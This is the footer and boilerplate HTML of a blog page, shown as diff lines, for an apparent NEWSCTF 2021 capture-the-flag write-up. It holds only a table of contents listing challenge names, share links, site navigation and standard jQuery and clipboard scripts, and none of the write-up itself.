+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc%E7%B0%BD%E5%88%B0%E8%99%95"><span class="toc-number">1.1.</span> <span class="toc-text">misc簽到處</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%BD%E8%A3%9D%E8%80%85"><span class="toc-number">1.2.</span> <span class="toc-text">偽裝者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%BD%E8%AA%AA%E4%BD%A0%E5%96%9C%E6%AD%A1%E8%96%85%E7%BE%8A%E6%AF%9B"><span class="toc-number">1.3.</span> <span class="toc-text">聽說你喜歡薅羊毛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happy-ox"><span class="toc-number">1.4.</span> <span class="toc-text">happy ox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EMOJI"><span class="toc-number">1.5.</span> <span class="toc-text">EMOJI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E6%96%A4%E5%B0%91%E5%85%A9"><span class="toc-number">1.6.</span> <span class="toc-text">缺斤少兩</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#girlfriend"><span class="toc-number">2.1.</span> <span class="toc-text">girlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ%E5%A5%97%E5%A8%83"><span class="toc-number">2.2.</span> <span class="toc-text">EZ套娃</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/bf20b880.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&text=NEWSCTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&is_video=false&description=NEWSCTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NEWSCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/bf20b880.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&title=NEWSCTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&name=NEWSCTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/bf20b880.html&t=NEWSCTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
